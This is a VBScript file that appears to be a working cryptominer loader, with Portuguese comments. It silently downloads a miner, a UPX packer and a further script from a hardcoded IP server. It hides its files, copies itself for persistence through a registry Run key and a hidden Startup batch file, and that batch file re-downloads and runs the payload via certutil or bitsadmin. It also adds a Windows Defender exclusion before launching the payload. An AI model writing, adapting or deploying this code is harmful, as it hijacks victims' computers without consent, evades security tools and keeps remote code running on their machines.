Option Explicit

Dim fso, shell, http, wshShell, localApp, tempRoot, hiddenFolder
Dim upxPath, minPath, boraPath, loaderCopyPath, batPath, regKey, wnloaderPath
Dim serverUrl, wshEnv, startupPath, logFile

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set wshShell = CreateObject("WScript.Shell")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set wshEnv = wshShell.Environment("Process")

' Configurações
serverUrl = "http://15.228.181.140:8585"
localApp = wshEnv("LOCALAPPDATA")
tempRoot = localApp & "\TempCache"
hiddenFolder = tempRoot & "\cache_bora"
'logFile = tempRoot & "\loader_log.txt"

' Função para logar ações
Sub Log(msg)
    On Error Resume Next
    Dim ts : Set ts = fso.OpenTextFile(logFile, 8, True) ' 8 = Append
    ts.WriteLine Now & " - " & msg
    ts.Close : Set ts = Nothing
    On Error GoTo 0
End Sub

Log "=== Início do loader.vbs (versão 7.9.12) ==="

' Caminhos
boraPath = hiddenFolder & "\bora.vbs"
upxPath = hiddenFolder & "\upx.exe"
minPath = hiddenFolder & "\sbrminer.exe"
loaderCopyPath = hiddenFolder & "\winload.vbs"
wnloaderPath = hiddenFolder & "\wnloader.vbs"
startupPath = wshEnv("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup"
batPath = startupPath & "\WinSvcHost.bat"
regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SystemCore"

Log "Caminhos definidos."

' Criação de diretórios
If Not fso.FolderExists(tempRoot) Then
    fso.CreateFolder tempRoot
    Log "Criada pasta tempRoot: " & tempRoot
End If

If Not fso.FolderExists(hiddenFolder) Then
    fso.CreateFolder hiddenFolder
    fso.GetFolder(hiddenFolder).Attributes = 2 ' Oculto
    Log "Criada pasta oculta: " & hiddenFolder
End If

If Not fso.FolderExists(startupPath) Then
    fso.CreateFolder startupPath
    Log "Criada pasta startup: " & startupPath
End If

' Função de Download Silencioso
Sub SilentDL(URL, Dest)
    On Error Resume Next
    Log "Baixando: " & URL & " para " & Dest
    http.Open "GET", URL, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send
    If http.Status = 200 Then
        Dim st : Set st = CreateObject("ADODB.Stream")
        st.Type = 1 : st.Open
        st.Write http.ResponseBody
        st.SaveToFile Dest, 2 ' Overwrite
        st.Close : Set st = Nothing
        Log "Download concluído: " & Dest
    Else
        Log "Download falhou: " & URL & " (Status: " & http.Status & ")"
    End If
    On Error GoTo 0
End Sub

' Verifica se precisa baixar arquivos principais
Dim needsSetup : needsSetup = False
If Not fso.FileExists(boraPath) Then needsSetup = True
If Not fso.FileExists(upxPath) Then needsSetup = True

Log "needsSetup=" & needsSetup

If needsSetup Then
    SilentDL serverUrl & "/upx.exe", upxPath
    SilentDL serverUrl & "/sbrminer.exe", minPath
    SilentDL serverUrl & "/bora.vbs", boraPath

    ' Compacta o minerador se UPX estiver presente
    If fso.FileExists(upxPath) And fso.FileExists(minPath) Then
        Log "Compactando minerador com UPX..."
        shell.Run """" & upxPath & """ --best """ & minPath & """", 0, True
        Log "Compactação concluída."
    End If

    ' Copia o próprio loader para a pasta oculta para persistência
    If fso.FileExists(WScript.ScriptFullName) Then
        fso.CopyFile WScript.ScriptFullName, loaderCopyPath, True
        Log "Cópia do loader para pasta oculta concluída: " & loaderCopyPath
    End If
Else
    Log "Arquivos principais já existem. Pulando download."
End If

' --- PERSISTÊNCIA ---

' 1. Registro (HKCU Run)
On Error Resume Next
    Log "Deletando chave de registro antiga: " & regKey
    shell.Run "reg delete """ & regKey & """ /f", 0, True
    Log "Registro deletado (ou não existia)."
On Error GoTo 0

If fso.FileExists(loaderCopyPath) Then
    Dim regCmd : regCmd = "reg add """ & regKey & """ /ve /t REG_SZ /d ""cscript //nologo """ & loaderCopyPath & """ /f"
    Log "Adicionando registro para loaderCopyPath."
    shell.Run regCmd, 0, True
ElseIf fso.FileExists(boraPath) Then
    regCmd = "reg add """ & regKey & """ /ve /t REG_SZ /d ""cscript //nologo """ & boraPath & """ /f"
    Log "Adicionando registro para boraPath."
    shell.Run regCmd, 0, True
End If

' 2. Startup BAT (Conteúdo Corrigido e Testado)
Dim tempBatPath : tempBatPath = tempRoot & "\tmp_bat.bat"

' Conteúdo exato do BAT que funcionou
Dim batContent
batContent = "@echo off" & vbCrLf & _
             "setlocal enabledelayedexpansion" & vbCrLf & _
             "" & vbCrLf & _
             ":: Configurações absolutas e verificáveis" & vbCrLf & _
             "set ""TEMP_CACHE=C:\Users\Administrator\AppData\Local\TempCache""" & vbCrLf & _
             "set ""CACHE_BORA=%TEMP_CACHE%\cache_bora""" & vbCrLf & _
             "set ""URL=http://15.228.181.140:8585/winload.vbs""" & vbCrLf & _
             "set ""DEST=%CACHE_BORA%\winload.vbs""" & vbCrLf & _
             "" & vbCrLf & _
             ":: Garante que a pasta TempCache existe" & vbCrLf & _
             "if not exist ""%TEMP_CACHE%"" (" & vbCrLf & _
             "    mkdir ""%TEMP_CACHE%"" >nul 2>&1" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             ":: Garante que a pasta cache_bora existe e está oculta" & vbCrLf & _
             "if not exist ""%CACHE_BORA%"" (" & vbCrLf & _
             "    mkdir ""%CACHE_BORA%"" >nul 2>&1" & vbCrLf & _
             "    attrib +h ""%CACHE_BORA%"" >nul 2>&1" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             ":: Cria o arquivo de log se não existir" & vbCrLf & _
             "if not exist ""%LOG_FILE%"" (" & vbCrLf & _
             "    echo [%date% %time%] --- Inicio do log --- > ""%LOG_FILE%""" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             ":check_process" & vbCrLf & _
             "tasklist /FI ""IMAGENAME eq sbrminer.exe"" /NH | find /I ""sbrminer.exe"" >nul" & vbCrLf & _
             "if %errorlevel% equ 0 (" & vbCrLf & _
             "    echo [%date% %time%] sbrminer.exe esta em execucao >> ""%LOG_FILE%""" & vbCrLf & _
             "    goto :eof" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             "echo [%date% %time%] sbrminer.exe nao esta em execucao. Tentando baixar... >> ""%LOG_FILE%""" & vbCrLf & _
             "" & vbCrLf & _
             ":: Tenta baixar usando certutil" & vbCrLf & _
             "certutil -urlcache -split -f ""%URL%"" ""%DEST%"" >nul 2>&1" & vbCrLf & _
             "" & vbCrLf & _
             ":: Verifica se o download foi bem-sucedido" & vbCrLf & _
             "if exist ""%DEST%"" (" & vbCrLf & _
             "    echo [%date% %time%] Download concluido. Executando... >> ""%LOG_FILE%""" & vbCrLf & _
             "    start /B cscript //nologo ""%DEST%""" & vbCrLf & _
             "    goto :eof" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             ":: Se falhar, tenta com bitsadmin" & vbCrLf & _
             "if not exist ""%DEST%"" (" & vbCrLf & _
             "    echo [%date% %time%] Falha com certutil. Tentando bitsadmin... >> ""%LOG_FILE%""" & vbCrLf & _
             "    bitsadmin /transfer DownloadJob /download /priority foreground ""%URL%"" ""%DEST%"" >nul 2>&1" & vbCrLf & _
             "" & vbCrLf & _
             "    if exist ""%DEST%"" (" & vbCrLf & _
             "        echo [%date% %time%] Download com bitsadmin concluido. Executando... >> ""%LOG_FILE%""" & vbCrLf & _
             "        start /B cscript //nologo ""%DEST%""" & vbCrLf & _
             "        goto :eof" & vbCrLf & _
             "    )" & vbCrLf & _
             ")" & vbCrLf & _
             "" & vbCrLf & _
             ":: Se ainda falhar" & vbCrLf & _
             "echo [%date% %time%] ERRO: Falha no download. >> ""%LOG_FILE%""" & vbCrLf & _
             "exit /b 1"

Log "Criando arquivo temporário BAT em: " & tempBatPath

' Cria arquivo temporário na pasta Temp
Dim ts
Set ts = fso.CreateTextFile(tempBatPath, True)
ts.Write batContent
ts.Close
Set ts = Nothing
Log "Arquivo temporário BAT criado."

' Move para a pasta Startup via CMD
Log "Movendo arquivo BAT para Startup: " & batPath
shell.Run "cmd /c move /y """ & tempBatPath & """ """ & batPath & """", 0, True

' Verifica se o arquivo foi movido
If fso.FileExists(batPath) Then
    fso.GetFile(batPath).Attributes = 2 ' Oculto
    Log "Arquivo BAT movido e ocultado com sucesso: " & batPath
Else
    Log "ERRO: Arquivo BAT não foi movido para Startup!"
End If

' --- FINALIZAÇÃO ---

' Adiciona exclusão no Windows Defender
Log "Adicionando exclusão no Defender para: " & hiddenFolder
shell.Run "powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath '" & Replace(hiddenFolder, "\", "\\") & "'", 0, True

' Executa o payload imediatamente se existir
If fso.FileExists(boraPath) Then
    Log "Executando bora.vbs imediatamente..."
    shell.Run "cscript //nologo """ & boraPath & """", 0, False
Else
    Log "bora.vbs não encontrado. Pulando execução imediata."
End If

Log "=== Fim do loader.vbs (versão 7.9.12) ==="
